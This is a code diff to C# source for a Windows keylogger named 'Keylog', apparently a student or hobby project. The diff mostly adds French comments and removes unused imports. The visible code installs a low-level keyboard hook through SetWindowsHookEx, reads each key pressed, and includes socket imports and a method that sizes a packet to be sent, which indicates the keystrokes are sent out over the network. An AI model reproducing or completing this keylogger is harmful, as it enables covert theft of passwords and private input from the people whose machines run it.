@@ -2,23 +2,17 @@
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Windows.Forms;
-using System.IO;
 using System.Net.Sockets;
 using System.Net;
 using System.Text;
-
-using static System.Net.Mime.MediaTypeNames;
 
 namespace Keylog { 
 
 	
     public class Keylog_exe
 	{
-        // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
         
-        
-    // ----------------------------- END -------------------------------- //
-
+        // Variable de classe
         public static string user_name;
         private static int WH_KEYBOARD_LL;
         private static int WM_KEYDOWN ;
@@ -40,6 +34,7 @@ namespace Keylog {
         }
 
 
+        //Methode pour connaitre la taille du paquet qu'on envoi
         static int getLenght_byte(byte[] b)
         {
             int a  = 0;
@@ -50,6 +45,7 @@ namespace Keylog {
             return a;
         }
 
+        //Methode principal
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             string name = user_name;
@@ -69,10 +65,7 @@ namespace Keylog {
             }
             
 
-
-
-
-
+            // analyse du caractère qui a ete taper 
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
@@ -98,6 +91,7 @@ namespace Keylog {
                 }
             }
 
+            // rappel de fonction pour attendre à nouveau un input
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
@@ -112,6 +106,8 @@ namespace Keylog {
             return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
         }
 
+
+        // Importation des libraires pour le keylogger
         [DllImport("user32.dll")]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
